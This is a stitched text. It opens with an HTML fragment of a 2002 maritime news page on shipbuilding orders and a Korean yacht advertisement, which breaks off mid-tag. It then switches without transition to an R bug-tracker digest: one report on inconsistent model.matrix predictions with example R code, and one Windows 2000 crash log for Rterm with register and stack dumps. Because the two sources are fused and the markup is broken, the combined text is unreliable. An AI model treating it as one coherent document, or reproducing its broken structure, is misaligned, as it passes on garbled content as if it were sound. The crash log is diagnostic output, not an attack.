vAlign=top width=15 bgColor=#ffffff height=1>&nbsp;5. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#ffffff height=1>Canfornav plans to order four
37500dwt bulk carriers. The vessels will be for lake
trading, and shipyard will be nominated. </TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffe6 height=21>&nbsp;6. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#FFFFE6 height=21>NITC (Iran) plans
newbuilding for sixteen LNG carriers from Japan, Korea, China shipyards.
</TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffff height=1>&nbsp;7. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#ffffff height=1>Murmansk Shipping Co(MSC,
Russia) plans to order four (2+2) Panamax Tankers from Admiralty
Shipyard (Russia). </TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffe6 height=21>&nbsp;8. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#FFFFE6 height=21>Hudong-Zhonghua
shipbuilding(Group) will make the LOI for LNG
construction with Guangdong LNG Transportation Project office
(GLPTO).
</TD>
</tr>
<TR>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffff height=14>&nbsp;9. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#ffffff height=14>Stolt Offshore S.A. got
award for $60 million EPIC contract from Norsk Hydro for the Vigdis Extension. </TD></TR>
<TR>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffe6 height=14>10.. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#ffffe6 height=14>STX Shipbuilding (Korea)
contracted a 23000CBM LPG Carrier with Qatar Shipping Co
(Doha) at US$30.0mill.&nbsp;
</TD></TR>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffff height=14>11. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#ffffff height=14><b>S. Korea to take EU Shipbuilding
subsidy issue to WTO</b><br>
South Korea is preparing to file a complaint to the World Trade Organization against the European Union's planned subsidies for its
shipbuilders. According to the ministry, the move is a response to the
EU's complaint to the WTO Monday, which alleged South Korea is providing subsidies to its shipbuilders.
</TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffe6 height=14>12. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#FFFFE6 height=14><b>Record order intake at Japanese yards.</b><br>
Japanese yards saw export orders in the first half of the fiscal year rise to their highest level since at least 1996 driven by a combination of two months of exceptionally strong ordering and continued demand for dry bulk tonnage.
During the April to September 2002 period a total of 161 ships of 7.4mgt were reported ordered for export, according to figures from the Japan Ship Exporters' Association
(JSEA). This compares with 138 ships of 6.9mgt in the corresponding period in the previous fiscal year, 135 ships of 6.6mgt in FY2000 and 133 ships of 4.8mgt in FY1999.
Thanks to the record order intake Japanese shipyards now sit on their largest order backlog in more than a decade, with 489 ships of 24.9mgt waiting to be constructed.&nbsp; </TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffff height=14>13. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#ffffff height=14><b>Korean Shipbuilding order levels drop</b><br>
Newbuilding orders contracted at Korean shipbuilders in the third quarter of 2002 fell by over 10% to 1.3mcgt compared to a year ago and government officials have warned that the situation is set to deteriorate further.
The Ministry also forecast that new orders would drop 15.4% to about 5.42mcgt for the whole of 2002.&nbsp;
</TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffe6 height=14>14. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#FFFFE6 height=14><b>ABS named as
classification society for world's first newbuilding LPG FPSO.</b><br>
This will include LPG storage tanks and LPG production plants
such as gas separators, gas refrigerators and boil-off gas
reliquefaction units on topsides. Mitsui and IHI have signed
for the newbuilding. </TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
vAlign=top width=15 bgColor=#ffffff height=14>15. </TD>
<TD class=text style="padding-top: 1; padding-bottom: 0"
width=391 bgColor=#ffffff height=14><b>Fire-damaged cruise ship towed for repairs</b><br>
The Diamond Princess, a luxury cruise ship damaged in an Oct. 1 fire while still being outfitted, was towed Monday to a second Mitsubishi Heavy Industries Ltd. dock for repairs. The Diamond Princess, which will be one of the largest luxury liners in the world, is 290 meters long, 41.5 meters wide and can accommodate 3,100 passengers. MHI and P&amp;O Princess Cruises PLC, the Britain-based owner of the ship, agreed Oct. 10 to continue work on the cruise liner despite the damage.
</TD>
</tr>
</TBODY></TABLE></TD></TR>
<TR>
<TD vAlign=top bgColor=#ffffff colSpan=2 height=1>
<TABLE height=1 cellSpacing=1 cellPadding=0 width=592
bgColor=#ffffff border=0>
<TBODY>
<tr>
<TD class=text align=middle bgColor=#a9340f colspan=2
height=1 width="590"></TD>
</tr>
<tr>
<TD class=text align=middle bgColor=#feb05a colspan=2
height=17 width="590"><P align=right><FONT color=#666666><B>::: Company
and Product Advertisement
:::&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</B></FONT><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12><FONT color=#666666><B> <FONT color=#808080><A
href="http://www.marinedigital.com/en/com_ad/form/ad.asp">Send
your Ads</A></FONT></B></FONT></P></TD>
</tr>
<tr>
<TD style="padding-left: 3; padding-top: 5px; padding-bottom: 5" vAlign=top width=590 colspan=2
height=1 bgcolor="#FFFFE8">
<table>
<tr>
<td class="text" align="middle" width="590" bgColor="#ffffe8" colSpan="4" height="17">
<p align="left"><b>&lt;&lt; Various Yachts &amp; Boats
are built by Korean shipyards &gt;&gt;</b></p>
</td>
</tr>
<tr>
<TD align=left colspan=4 height=1 width="590" style="padding-top: 2; padding-bottom: 2">
Small and medium size shipyards in Korea build various yachts
such as motor yachts, MEGA yacht, sailing yacht, Fishing boats
and patrol boats.</TD>
</tr>
<tr>
<TD align=middle colspan=4 height=1 width="590" style="padding-top: 2; padding-bottom: 2">
</TD>
</tr>
<tr>
<TD class=text align=middle bgcolor=#CCCCCC
height=17 width="149">
<p align="center"><img border="0" src="http://www.marinedigital.com/en/news/img/W34-1.gif" width="143" height="109"></TD>
<TD class=text align=middle bgcolor=#CCCCCC
height=17 width="149">
<p align="center"><img border="0" src="http://www.marinedigital.com/en/news/img/W34-2.gif" width="138" height="109"></TD>
<TD class=text align=middle bgcolor=#CCCCCC
height=17 width="149">
<p align="center"><IMG
src="http://www.marinedigital.com/en/news/img/W34-3.gif" border=0 width="139" height="109"> </TD>
<TD class=text align=middle bgcolor=#CCCCCC
height=17 width="149"><img border="0" src="http://www.marinedigital.com/en/news/img/W34-4.gif" width="143" height="109"></TD>
</tr>
<tr>
<TD class=text align=center bgColor=#CCCCCC
height=17 width="149" style="border-style: outset; border-width: 2">
<b>50FT Motor Yacht</b></TD>
<TD class=text align=center bgColor=#CCCCCC
height=17 width="149" style="border-style: outset; border-width: 2">
<b>80FT MEGA Yacht</b></TD>
<TD class=text align=center bgColor=#CCCCCC
height=17 width="149" style="border-style: outset; border-width: 2">
<b>Fishing Boat</b></TD>
<TD class=text align=center bgColor=#CCCCCC
height=17 width="149" style="border-style: outset; border-width: 2">
<b>Fishing Boat</b></TD>
</tr>
</table>
</TD>
</tr>
<tr>
<TD style="padding-left: 3; padding-top: 5px; padding-bottom: 5" vAlign=top width=590 colspan=2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2206 *
Subject: model.matrix (via predict)
From: Glenn.Stone@csiro.au
Date: Thu, 24 Oct 2002 06:33:02 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2206 <==
From Glenn.Stone@csiro.au  Thu Oct 24 06:33:04 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA24508
	for <R-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 06:33:02 +0200 (MET DST)
Date: Thu, 24 Oct 2002 06:33:02 +0200 (MET DST)
From: Glenn.Stone@csiro.au
Message-Id: <200210240433.GAA24508@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: model.matrix (via predict)

Full_Name: Glenn Stone
Version: 1.5.1 and 1.6.0
OS: win2000
Submission from: (NULL) (168.140.227.9)


The following code produces incorrect fitted values in version 1.5.1 and an
error in 1.6.0 

   Error in "contrasts<-"(*tmp*, value = "contr.treatment") : 
           contrasts apply only to factors
   In addition: Warning message: 
   variable ihalf is not a factor in: model.frame.default(object, data, xlev =
xlev) 

The problem in 1.5.1 seems to be model.matrix return inconsistently ordered
interaction terms. There are abviously several work arounds.


### Start of example
dfr <- expand.grid(i=0:154,j=0:154)
dfr <- dfr[with(dfr,i+j<=154),]

dfr$logj <- with(dfr,log(j+0.5))
dfr$jmin6 <- with(dfr, pmin(j,6))
dfr$ihalf <- with(dfr, factor(floor(i/6)))
dfr$i100 <- with(dfr, ifelse(i<100,1,0))
dfr$j0 <- with(dfr, ifelse(j==0,1,0))

Ai <- runif(length(levels(dfr$ihalf)))
Ai <- Ai-Ai[1]
Bi <- runif(length(levels(dfr$ihalf)))
Bi <- (Bi-Bi[1])/10

eta <- with(dfr, -5 -2.5*logj - 3*i100*j0
            + 0.01*jmin6+Ai[as.numeric(ihalf)]
            +Bi[as.numeric(ihalf)]*jmin6)

dfr$clms <- sapply( eta , function(x) rpois(1,1e6*exp(x)))
                                            
gg <- glm(clms~ logj + i100:j0 + jmin6 + ihalf + ihalf:jmin6,
          data=dfr,
          family=poisson)

plot(predict(gg),predict(gg,newdata=dfr))
### End of example
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2207 *
Subject: crash report
From: Ross Darnell <rdarnell@shrs.uq.edu.au>
Date: 24 Oct 2002 17:54:07 +1000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2207 <==
From rdarnell@shrs.uq.edu.au  Thu Oct 24 09:55:05 2002
Received: from bunyip.cc.uq.edu.au (root@bunyip.cc.uq.edu.au [130.102.2.1])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA25954
	for <r-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 09:54:59 +0200 (MET DST)
Received: from SHRS-LVL8-RD ([130.102.133.128])
	by bunyip.cc.uq.edu.au (8.9.3/8.9.3) with ESMTP id RAA25842
	for <r-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 17:54:10 +1000 (GMT+1000)
To: r-bugs@biostat.ku.dk
Subject: crash report
From: Ross Darnell <rdarnell@shrs.uq.edu.au>
Date: 24 Oct 2002 17:54:07 +1000
Message-ID: <smywnug0.fsf@shrs.uq.edu.au>
Lines: 377
User-Agent: Gnus/5.0808 (Gnus v5.8.8) XEmacs/21.4 (Informed Management (Windows [3]))
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


Rterm crashed while I was creating some plots and a message box
appearing saying there was an error log created. Searching for
recently created files I found this one which was modified at the time
Rterm crashed.  I wasn't sure if you were interested but here it is
anyway.


Regards

Ross Darnell


Microsoft (R) Windows 2000 (TM) Version 5.00 DrWtsn32
Copyright (C) 1985-1999 Microsoft Corp. All rights reserved.


Application exception occurred:
        App:  (pid=1292)
        When: 10/24/2002 @ 17:37:59.435
        Exception number: c0000005 (access violation)

*----> System Information <----*
        Computer Name: SHRS-LVL8-RD
        User Name: rdarnell
        Number of Processors: 1
        Processor Type: x86 Family 15 Model 2 Stepping 4
        Windows 2000 Version: 5.0
        Current Build: 2195
        Service Pack: 2
        Current Type: Uniprocessor Free
        Registered Organization: University of Queensland
        Registered Owner: Ross Darnell

*----> Task List <----*
   0 Idle.exe
   8 System.exe
 140 smss.exe
 164 csrss.exe
 160 winlogon.exe
 212 services.exe
 224 lsass.exe
 392 svchost.exe
 424 spoolsv.exe
 484 svchost.exe
 612 regsvc.exe
 624 MSTask.exe
 696 wm.exe
 532 NALNTSRV.exe
 816 Explorer.exe
 876 LTSMMSG.exe
 884 PRISMSTA.exe
 892 SynTPLpr.exe
 900 SynTPEnh.exe
 916 sistray.exe
 924 khooker.exe
 932 CPLBY25.exe
 940 PRPCUI.exe
 800 dpmw32.exe
 988 NWTRAY.exe
1012 realsched.exe
1048 internat.exe
1096 WZQKPICK.exe
1108 NALDESK.exe
 964 xemacs.exe
 336 MOZILLA.exe
1304 ispell.exe
1292 Rterm.exe
1392 ssh.exe
 956 rnathchk.exe
1432 AcroRd32.exe
1396 drwtsn32.exe
   0 _Total.exe

(00400000 - 00406000) 
(77F80000 - 77FFB000) 
(01510000 - 016E4000) 
(016F0000 - 0170B000) 
(77DB0000 - 77E0B000) 
(77E80000 - 77F35000) 
(77D40000 - 77DB0000) 
(77B50000 - 77BD9000) 
(77F40000 - 77F7C000) 
(77E10000 - 77E74000) 
(76B30000 - 76B6E000) 
(77C70000 - 77CBA000) 
(782F0000 - 78532000) 
(78000000 - 78046000) 
(77820000 - 77827000) 
(759B0000 - 759B6000) 
(77A50000 - 77B46000) 
(779B0000 - 77A4B000) 
(6E420000 - 6E426000) 
(75E60000 - 75E7A000) 
(63000000 - 63014000) 
(775A0000 - 77625000) 
(77840000 - 7787C000) 
(770C0000 - 770E3000) 
(128F0000 - 128FE000) 
(12900000 - 1290A000) 
(12910000 - 12918000) 
(12920000 - 12934000) 
(12960000 - 12975000) 
(12980000 - 1298B000) 
(12990000 - 12999000) 
(129A0000 - 129A9000) 
(129B0000 - 129CD000) 
(75050000 - 75058000) 
(75030000 - 75043000) 
(75020000 - 75028000) 
(785C0000 - 785CC000) 
(77980000 - 779A4000) 
(77340000 - 77353000) 
(77520000 - 77525000) 
(77320000 - 77337000) 
(75150000 - 75160000) 
(75170000 - 751BF000) 
(77BE0000 - 77BEF000) 
(751C0000 - 751C6000) 
(77950000 - 77979000) 
(773B0000 - 773DE000) 
(77380000 - 773A2000) 
(77830000 - 7783E000) 
(77880000 - 7790D000) 
(77C10000 - 77C6D000) 
(774E0000 - 77512000) 
(774C0000 - 774D1000) 
(77530000 - 77552000) 
(77360000 - 77379000) 
(777E0000 - 777E8000) 
(66210000 - 66219000) 
(50D50000 - 50D92000) 
(50D00000 - 50D15000) 
(50DF0000 - 50E10000) 
(50DB0000 - 50DD9000) 
(66220000 - 6622C000) 
(1C000000 - 1C006000) 
(777F0000 - 777F5000) 
(74FD0000 - 74FEF000) 
(75010000 - 75017000) 
(12EB0000 - 12EB8000) 

State Dump for Thread Id 0x51c

eax=00000137 ebx=028342d4 ecx=00000006 edx=00000000 esi=025f916c edi=00000000
eip=0164a224 esp=0022f708 ebp=0022f720 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000202


function: drawto
        0164a202 eb3f             jmp     getpixels+0x13 (01652543)
        0164a204 83c4f4           add     esp,0xf4
        0164a207 53               push    ebx
        0164a208 e8a3fbffff       call    get_context (01649db0)
        0164a20d a3702b6c01       mov     [dc (016c2b70)],eax    ds:016c2b70=00000000
        0164a212 83c410           add     esp,0x10
        0164a215 8b8340010000     mov     eax,[ebx+0x140]        ds:02834414=00000137
        0164a21b 85c0             test    eax,eax
        0164a21d 741d             jz      init_menus+0xcc (0165453c)
        0164a21f a358296801       mov   [current (01682958)],eax ds:01682958=00000137
FAULT ->0164a224 8918             mov     [eax],ebx              ds:00000137=????????
        0164a226 83c4f8           add     esp,0xf8
        0164a229 ff7014           push    dword ptr [eax+0x14]   ds:00ead709=????????
        0164a22c ff7004           push    dword ptr [eax+0x4]    ds:00ead709=????????
        0164a22f e87cfdffff       call    finish_contexts+0x28 (01649fb0)
        0164a234 a364296801       mov   [win_rgb (01682964)],eax ds:01682964=00000000
        0164a239 eb08             jmp     sortpalette+0x6cf (01653243)
        0164a23b 90               nop
        0164a23c a158296801       mov   eax,[current (01682958)] ds:01682958=00000137
        0164a241 8918             mov     [eax],ebx              ds:00000137=????????
        0164a243 8b5de8           mov     ebx,[ebp+0xe8]         ss:010dccf2=????????
        0164a246 c9               leave

*----> Stack Back Trace <----*

FramePtr ReturnAd Param#1  Param#2  Param#3  Param#4  Function Name
0022F720 0164A633 028342D4 00000000 0000029D 0000029D !drawto 
0022F760 0164F08B 025F916C 12020E0A 00000000 00000000 !clear 
0022F7D0 0164F485 025F916C 0017022A 00000000 0017022A !gprintf 
0022F800 0164F5FC 0017022A 0000000F 00000000 00000000 !gprintf 
0022F850 77E12E98 0017022A 0000000F 00000000 00000000 !app_win_proc 
0022F870 77E139A3 0164F5D0 0017022A 0000000F 00000000 user32!ScrollDC 
0022F88C 77E1395F 0194AEA0 0000000F 00000000 00000000 user32!GetQueueStatus 
0022F8B4 77FA032F 0022F8C4 00000018 0194AEA0 0000000F user32!GetQueueStatus 
0022F954 77E15824 016BC7C0 00000001 0164FCBF 016BC7C0 ntdll!KiUserCallbackDispatcher 
0022F990 0152FC05 00000001 00000400 0022FA5C 0158A463 user32!DispatchMessageA 
0022F9B0 0152FA05 01C63730 0022FA5C 00000400 00000001 !Rconsolesetwidth 
0022F9E0 015A0FC0 01C63730 0022FA5C 00000400 00000001 !R_ReadConsole 
0022FA20 015A1697 01C63DD0 00000000 00000000 0022FA50 !Rf_ReplIteration 
0022FE70 015A1F58 01C63DD0 00000000 00000000 77E8615B !Rf_ReplIteration 
0022FE90 015A1F70 00401431 00000001 0022FEB0 0040153D !run_Rmainloop 
0022FEA0 0040153D 00400000 00000000 0022FEE0 0040139C !Rf_mainloop 
0022FEB0 0040139C 00000002 01C224A0 00401674 00401759 !<nosymbols> 
0022FEE0 0040166D 00400000 00000000 01412433 00000000 !<nosymbols> 
0022FF60 004010F4 00000002 01C224A0 01C22D38 00000005 !<nosymbols> 
0022FFA0 004011EF 00000001 00000000 8043107B 77E97D05 !<nosymbols> 
0022FFC0 77E97D08 77F82DC2 77FCF170 7FFDF000 C0000005 !<nosymbols> 
0022FFF0 00000000 00000000 00000000 00000000 00000000 kernel32!CreateProcessW 

*----> Raw Stack Dump <----*
0022f708  d4 42 83 02 21 00 f0 00 - 60 f7 22 00 27 a6 64 01  .B..!...`.".'.d.
0022f718  00 00 00 00 9d 02 00 00 - 60 f7 22 00 33 a6 64 01  ........`.".3.d.
0022f728  d4 42 83 02 00 00 00 00 - 9d 02 00 00 9d 02 00 00  .B..............
0022f738  6c 91 5f 02 90 f7 22 00 - 2a 02 17 00 2a 02 17 00  l._...".*...*...
0022f748  6c 91 5f 02 6f f0 64 01 - 00 00 00 00 00 00 00 00  l._.o.d.........
0022f758  9d 02 00 00 9d 02 00 00 - d0 f7 22 00 8b f0 64 01  .........."...d.
0022f768  6c 91 5f 02 0a 0e 02 12 - 00 00 00 00 00 00 00 00  l._.............
0022f778  00 00 00 00 6c 91 5f 02 - 0f 00 00 00 2a 57 65 01  ....l._.....*We.
0022f788  6c 91 5f 02 2a 02 17 00 - 0a 03 01 0d 01 00 00 00  l._.*...........
0022f798  00 00 00 00 08 00 00 00 - f8 01 00 00 9d 02 00 00  ................
0022f7a8  00 00 00 00 00 00 00 00 - 00 00 00 00 00 40 00 00  .............@..
0022f7b8  08 1b 80 e2 88 6f 80 e2 - 88 40 30 85 14 07 ad bc  .....o...@0.....
0022f7c8  59 13 01 a0 ec 13 01 a0 - 00 f8 22 00 85 f4 64 01  Y........."...d.
0022f7d8  6c 91 5f 02 2a 02 17 00 - 00 00 00 00 2a 02 17 00  l._.*.......*...
0022f7e8  00 00 00 00 00 00 00 00 - 0f 00 00 00 02 00 00 00  ................
0022f7f8  a0 00 00 00 02 00 00 02 - 50 f8 22 00 fc f5 64 01  ........P."...d.
0022f808  2a 02 17 00 0f 00 00 00 - 00 00 00 00 00 00 00 00  *...............
0022f818  4c f8 22 00 00 00 00 00 - 9e 02 00 00 01 00 00 00  L.".............
0022f828  0f 00 00 00 c8 c7 6b 01 - c0 c7 6b 01 00 00 00 00  ......k...k.....
0022f838  00 00 00 00 2a 02 17 00 - 35 03 0f 00 02 00 00 00  ....*...5.......

State Dump for Thread Id 0x548

eax=77d50c62 ebx=00000246 ecx=0142072c edx=00000000 esi=014215b8 edi=014215f8
eip=77f82a84 esp=126efe28 ebp=126eff74 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000202


function: ZwReplyWaitReceivePortEx
        77f82a79 b8ac000000       mov     eax,0xac
        77f82a7e 8d542404         lea     edx,[esp+0x4]          ss:1359d3fb=????????
        77f82a82 cd2e             int     2e
        77f82a84 c21400           ret     0x14

*----> Stack Back Trace <----*

FramePtr ReturnAd Param#1  Param#2  Param#3  Param#4  Function Name
126EFF74 77D50781 77D50D7F 014215B8 00000000 40421080 ntdll!ZwReplyWaitReceivePortEx 
126EFFA8 77D50C7A 01420690 126EFFEC 77E8758A 014214D8 rpcrt4!RpcBindingSetOption 
126EFFB4 77E8758A 014214D8 00000000 40421080 014214D8 rpcrt4!RpcBindingSetOption 
126EFFEC 00000000 00000000 00000000 00000000 00000000 kernel32!SetFilePointer 

State Dump for Thread Id 0x558

eax=0000000a ebx=00000000 ecx=00000008 edx=00000000 esi=77f827dd edi=000000d4
eip=77f827e8 esp=128eff2c ebp=128eff50 iopl=0         nv up ei pl zr na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246


function: NtWaitForSingleObject
        77f827dd b8ea000000       mov     eax,0xea
        77f827e2 8d542404         lea     edx,[esp+0x4]          ss:1379d4ff=????????
        77f827e6 cd2e             int     2e
        77f827e8 c20c00           ret     0xc
        77f827eb 8b4124           mov     eax,[ecx+0x24]         ds:00ead5da=????????
        77f827ee 39420c           cmp     [edx+0xc],eax          ds:00ead5d2=????????
        77f827f1 0f85c9100000     jne     NtQueryDefaultLocale+0x115 (77f838c0)
        77f827f7 ff4208           inc     dword ptr [edx+0x8]    ds:00ead5d2=????????
        77f827fa 33c0             xor     eax,eax
        77f827fc c20400           ret     0x4
        77f827ff 90               nop
        77f82800 ff4a04           dec     dword ptr [edx+0x4]    ds:00ead5d2=????????
        77f82803 c20400           ret     0x4

*----> Stack Back Trace <----*

FramePtr ReturnAd Param#1  Param#2  Param#3  Param#4  Function Name
128EFF50 77E86A3D 000000D4 FFFFFFFF 00000000 0152FB48 ntdll!NtWaitForSingleObject 
128EFF80 7800A27B 00000000 00000000 0022F3E0 01C22A38 kernel32!WaitForSingleObject 
128EFFB4 77E8758A 01C22A38 00000000 0022F3E0 01C22A38 !beginthread 
128EFFEC 00000000 7800A224 01C22A38 00000000 00905A4D kernel32!SetFilePointer 

*----> Raw Stack Dump <----*
128eff2c  15 6a e8 77 d4 00 00 00 - 00 00 00 00 00 00 00 00  .j.w............
128eff3c  00 00 00 00 38 2a c2 01 - 38 2a c2 01 01 01 01 00  ....8*..8*......
128eff4c  01 01 01 00 80 ff 8e 12 - 3d 6a e8 77 d4 00 00 00  ........=j.w....
128eff5c  ff ff ff ff 00 00 00 00 - 48 fb 52 01 d4 00 00 00  ........H.R.....
128eff6c  ff ff ff ff 00 00 00 00 - 00 00 00 00 38 2a c2 01  ............8*..
128eff7c  b4 ff 8e 12 b4 ff 8e 12 - 7b a2 00 78 00 00 00 00  ........{..x....
128eff8c  00 00 00 00 e0 f3 22 00 - 38 2a c2 01 20 b0 0a 85  ......".8*.. ...
128eff9c  8c ff 8e 12 77 0d 43 80 - dc ff 8e 12 11 db 00 78  ....w.C........x
128effac  90 41 03 78 00 00 00 00 - ec ff 8e 12 8a 75 e8 77  .A.x.........u.w
128effbc  38 2a c2 01 00 00 00 00 - e0 f3 22 00 38 2a c2 01  8*........".8*..
128effcc  00 c0 fd 7f a7 9d fb 77 - c0 ff 8e 12 a7 9d fb 77  .......w.......w
128effdc  ff ff ff ff 5b 61 e8 77 - 80 b5 e8 77 00 00 00 00  ....[a.w...w....
128effec  00 00 00 00 00 00 00 00 - 24 a2 00 78 38 2a c2 01  ........$..x8*..
128efffc  00 00 00 00 4d 5a 90 00 - 03 00 00 00 04 00 00 00  ....MZ..........
128f000c  ff ff 00 00 b8 00 00 00 - 00 00 00 00 40 00 00 00  ............@...
128f001c  00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00  ................
128f002c  00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00  ................
128f003c  80 00 00 00 0e 1f ba 0e - 00 b4 09 cd 21 b8 01 4c  ............!..L
128f004c  cd 21 54 68 69 73 20 70 - 72 6f 67 72 61 6d 20 63  .!This program c
128f005c  61 6e 6e 6f 74 20 62 65 - 20 72 75 6e 20 69 6e 20  annot be run in 

State Dump for Thread Id 0x44c

eax=778321fe ebx=00000004 ecx=77db0260 edx=00000000 esi=77f8281e edi=00000004
eip=77f82829 esp=12bdfd24 ebp=12bdfd70 iopl=0         nv up ei pl zr na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246


function: NtWaitForMultipleObjects
        77f8281e b8e9000000       mov     eax,0xe9
        77f82823 8d542404         lea     edx,[esp+0x4]          ss:13a8d2f7=????????
        77f82827 cd2e             int     2e
        77f82829 c21400           ret     0x14

*----> Stack Back Trace <----*

FramePtr ReturnAd Param#1  Param#2  Param#3  Param#4  Function Name
12BDFD70 77E86E1A 12BDFD48 00000001 00000000 00000000 ntdll!NtWaitForMultipleObjects 
12BDFFB4 77E8758A 00000005 00000000 000B000A 0143F978 kernel32!WaitForMultipleObjects 
12BDFFEC 00000000 778321FE 0143F978 00000000 000000C8 kernel32!SetFilePointer 

*----> Raw Stack Dump <----*
12bdfd24  da 6d e8 77 04 00 00 00 - 48 fd bd 12 01 00 00 00  .m.w....H.......
12bdfd34  00 00 00 00 00 00 00 00 - 01 00 00 00 78 f9 43 01  ............x.C.
12bdfd44  01 00 00 00 84 01 00 00 - 88 01 00 00 98 01 00 00  ................
12bdfd54  18 02 00 00 5c fe 45 80 - a0 2f 40 80 ff ff ff ff  ....\.E../@.....
12bdfd64  d0 8a a0 bc d0 0c 45 80 - 90 07 41 85 b4 ff bd 12  ......E...A.....
12bdfd74  1a 6e e8 77 48 fd bd 12 - 01 00 00 00 00 00 00 00  .n.wH...........
12bdfd84  00 00 00 00 00 00 00 00 - b2 22 83 77 04 00 00 00  .........".w....
12bdfd94  b0 fe bd 12 00 00 00 00 - ff ff ff ff 78 f9 43 01  ............x.C.
12bdfda4  0a 00 0b 00 00 00 00 00 - f4 38 1a 85 e8 ae 44 85  .........8....D.
12bdfdb4  00 00 00 00 00 00 00 00 - 01 00 00 00 38 00 00 00  ............8...
12bdfdc4  23 00 00 00 23 00 00 00 - 00 00 00 00 0a 00 0b 00  #...#...........
12bdfdd4  78 f9 43 01 c8 43 f8 77 - 60 02 db 77 fe 21 83 77  x.C..C.w`..w.!.w
12bdfde4  00 00 00 00 32 75 e8 77 - 1b 00 00 00 00 02 00 00  ....2u.w........
12bdfdf4  fc ff bd 12 23 00 00 00 - c0 00 00 00 28 0e 0a 85  ....#.......(...
12bdfe04  b1 c0 01 00 98 70 71 85 - 00 07 00 00 b6 c9 44 80  .....pq.......D.
12bdfe14  b1 c0 01 00 98 70 71 85 - 01 d2 fd 7f 07 03 00 00  .....pq.........
12bdfe24  01 d2 fd 7f 07 03 00 00 - 5b d3 44 80 07 03 00 00  ........[.D.....
12bdfe34  30 5e 0a 85 00 d0 fd 7f - fc 07 30 c0 00 00 00 00  0^........0.....
12bdfe44  68 7e 0d 85 07 03 00 00 - 98 8b a0 bc 00 00 00 00  h~..............
12bdfe54  01 00 00 00 00 00 00 00 - 00 e0 fd 7f fc 07 30 c0  ..............0.

State Dump for Thread Id 0x538

eax=1c0026ca ebx=00000000 ecx=00000000 edx=00000000 esi=00000200 edi=0143b1c0
eip=77f830a5 esp=12e2ff14 ebp=12e2ffb4 iopl=0         nv up ei pl zr na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246


function: NtDeviceIoControlFile
        77f8309a b838000000       mov     eax,0x38
        77f8309f 8d542404         lea     edx,[esp+0x4]          ss:13cdd4e7=????????
        77f830a3 cd2e             int     2e
        77f830a5 c22800           ret     0x28

*----> Stack Back Trace <----*

FramePtr ReturnAd Param#1  Param#2  Param#3  Param#4  Function Name
12E2FFB4 77E8758A 00000000 0208003C 00000000 00000000 ntdll!NtDeviceIoControlFile 
12E2FFEC 00000000 1C0026CA 00000000 00000000 12E30008 kernel32!SetFilePointer 

*----> Raw Stack Dump <----*
12e2ff14  ed 24 00 1c 00 02 00 00 - 00 00 00 00 00 00 00 00  .$..............
12e2ff24  00 00 00 00 d0 30 00 1c - 83 00 00 90 60 ff e2 12  .....0......`...
12e2ff34  30 00 00 00 00 00 00 00 - 00 00 00 00 4e 27 00 1c  0...........N'..
12e2ff44  83 00 00 90 00 00 00 00 - 60 ff e2 12 30 00 00 00  ........`...0...
12e2ff54  3c 00 08 02 00 00 00 00 - 00 00 00 00 41 00 00 00  <...........A...
12e2ff64  00 00 00 00 ac 7c 88 eb - 00 00 00 00 00 00 00 00  .....|..........
